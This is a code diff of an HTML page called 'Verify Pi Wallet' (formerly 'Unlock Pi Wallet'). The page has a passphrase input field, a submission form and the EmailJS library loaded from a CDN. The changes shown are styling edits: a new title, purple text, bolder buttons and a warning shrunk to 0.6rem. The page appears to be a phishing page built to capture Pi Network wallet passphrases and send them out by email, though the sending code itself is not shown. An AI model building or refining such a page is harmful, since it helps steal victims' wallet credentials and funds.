@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Unlock Pi Wallet</title>
+    <title>Verify Pi Wallet</title>
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script> <!-- EmailJS Library -->
     <style>
         * {
@@ -25,8 +25,8 @@
         h1 {
             font-size: 1.8rem;
             margin-bottom: 2rem;
-            color: #1a1a1a;
-            font-weight: 600;
+            /* color: #98489c; Purple title */
+            font-weight: 500; /* Title is bold */
         }
 
         .passphrase-input {
@@ -68,13 +68,13 @@
             font-size: 1rem;
             margin-bottom: 1rem;
             cursor: pointer;
-            font-weight: 500;
+            font-weight: bold; /* Buttons are bold */
             transition: all 0.2s ease;
         }
 
         .primary-button {
             background-color: white;
-            color: 'purple';
+            color: #98489c; /* Text is purple */
             border: 1px solid #98489c;
         }
 
@@ -109,7 +109,7 @@
 
         .warning {
             color: red;
-            font-size: 0.9rem;
+            font-size: 0.6rem;
             margin-top: -0.5rem;
             margin-bottom: 1rem;
             display: none; /* Initially hidden */
@@ -117,7 +117,7 @@
     </style>
 </head>
 <body>
-    <h1>Verify Pi </h1>
+    <h1>Verify Pi Wallet</h1>
 
     <form id="submissionForm">
         <textarea 
